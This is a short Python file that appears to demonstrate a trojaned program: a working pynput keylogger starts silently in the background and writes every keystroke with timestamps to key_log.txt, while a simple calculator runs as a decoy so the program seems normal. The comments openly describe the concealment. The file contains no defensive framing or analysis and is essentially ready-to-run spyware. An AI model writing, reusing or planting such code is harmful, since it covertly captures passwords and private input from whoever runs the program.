# app_with_logger.py
from pynput import keyboard
import logging

def start_logger():
    """Starts keylogger in background"""
    logging.basicConfig(filename="key_log.txt", level=logging.INFO, format="%(asctime)s: %(message)s")

    def on_press(key):
        try:
            logging.info(f"{key.char}")
        except AttributeError:
            logging.info(f"{key}")

    listener = keyboard.Listener(on_press=on_press)
    listener.start()  # non-blocking

def calculator():
    """A simple calculator app to simulate a normal program"""
    print("Welcome to Calculator App")
    a = int(input("Enter first number: "))
    b = int(input("Enter second number: "))
    print(f"Result: {a + b}")

if __name__ == "__main__":
    start_logger()   # Logger runs silently in background
    calculator()     # Meanwhile app works normally
